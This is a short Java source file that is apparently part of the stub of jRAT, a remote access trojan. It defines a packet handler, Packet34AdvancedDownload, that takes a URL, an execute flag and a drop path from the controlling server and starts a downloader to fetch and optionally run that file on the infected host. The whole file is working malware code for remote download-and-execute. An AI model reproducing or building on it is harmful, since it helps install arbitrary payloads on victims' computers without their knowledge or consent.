package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.AdvDownloader;
import pro.jrat.stub.Connection;

public class Packet34AdvancedDownload extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		boolean exec = Connection.readBoolean();
		String drop = Connection.readLine().toLowerCase();
		new AdvDownloader(url, exec, drop).start();
	}

}
